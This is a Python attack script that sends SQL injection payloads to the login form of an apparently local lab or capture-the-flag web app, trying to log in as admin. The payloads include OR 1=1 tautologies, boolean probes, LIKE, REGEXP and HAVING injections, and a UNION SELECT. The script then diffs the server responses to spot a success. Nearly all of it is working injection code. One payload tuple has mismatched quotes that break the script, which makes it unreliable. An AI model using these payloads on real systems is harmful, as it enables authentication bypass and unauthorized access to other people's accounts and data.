import requests
from time import sleep

url = "http://127.0.0.1:32960/index.php"

print("=== Testing Numeric ID-based Injection ===\n")

# Maybe the query uses numeric IDs
numeric_payloads = [
    # Try to force the first ID
    ("1", "any"),
    ("1 OR 1=1", "any"),
    ("1 OR id=1", "any"),
    ("0 OR 1=1", "any"),
    ("999 OR 1=1", "any"),
    
    # Boolean with id
    ("1 AND 1=1", "any"),  # TRUE
    ("1 AND 1=2", "any"),  # FALSE
    
    # Username as ID
    ("admin OR 1=1", "any"),
    ("nonexist OR 1=1", "any"),
]

for user, pwd in numeric_payloads:
    resp = requests.get(url, params={'username': user, 'password': pwd})
    has_h3 = '<h3>' in resp.text
    is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
    has_success = has_h3 and not is_not_admin
    print(f"User='{user}' | Has h3: {has_h3} | Not admin: {is_not_admin} | Len: {len(resp.text)}")
    if has_success:
        print(f"  [!] SUCCESS!\n{resp.text}")

print("\n=== Comparing Response Contents ===\n")

# Get all responses and compare line-by-line
responses = {}
test_cases = [
    ("empty", {}),
    ("admin_wrong", {'username': 'admin', 'password': 'wrong'}),
    ("admin_sqli", {'username': "admin' OR '1'='1", 'password': 'x'}),
    ("user1", {'username': '1', 'password': 'x'}),
    ("user1_sqli", {'username': "1 OR 1=1", 'password': 'x'}),
]

for name, params in test_cases:
    resp = requests.get(url, params=params)
    responses[name] = resp.text
    has_h3 = '<h3>' in resp.text
    msg = "no h3"
    if has_h3:
        import re
        match = re.search(r'<h3>(.*?)</h3>', resp.text, re.DOTALL)
        msg = match.group(1).strip()[:50] if match else "h3 empty"
    print(f"{name:15} | Len: {len(resp.text)} | h3: {msg}")

# Find lines that differ between responses
print("\n=== Line Differences Analysis ===\n")

for name1, resp1 in responses.items():
    for name2, resp2 in responses.items():
        if name1 >= name2:
            continue
        lines1 = resp1.split('\n')
        lines2 = resp2.split('\n')
        if len(lines1) == len(lines2):
            diffs = [(i, l1, l2) for i, (l1, l2) in enumerate(zip(lines1, lines2)) if l1 != l2]
            if diffs:
                print(f"\n{name1} vs {name2}:")
                for i, l1, l2 in diffs[:3]:
                    print(f"  Line {i}:")
                    print(f"    {name1}: {l1[:80]}")
                    print(f"    {name2}: {l2[:80]}")
                    
print("\n=== SQLi with Specific Username Matching ===\n")

# Try to inject into a query like: SELECT * FROM users WHERE username=<input>
# and make it return admin
specific_payloads = [
    ("' OR username LIKE 'admin", "any"),
    ("' OR username REGEXP '^admin', "any"),
    ("' HAVING username='admin", "any"),
    ("' UNION ALL SELECT * FROM (SELECT 'admin' as username) AS t --", "any"),
]

for user, pwd in specific_payloads:
    try:
        resp = requests.get(url, params={'username': user, 'password': pwd})
        has_h3 = '<h3>' in resp.text
        is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
        has_success = has_h3 and not is_not_admin
        print(f"Payload: '{user[:50]}'")
        print(f"  SUCCESS: {has_success} | Len: {len(resp.text)}")
        if has_success:
            print(f"  [!] FULL:\n{resp.text}")
    except Exception as e:
        print(f"  Error on '{user[:30]}': {e}")

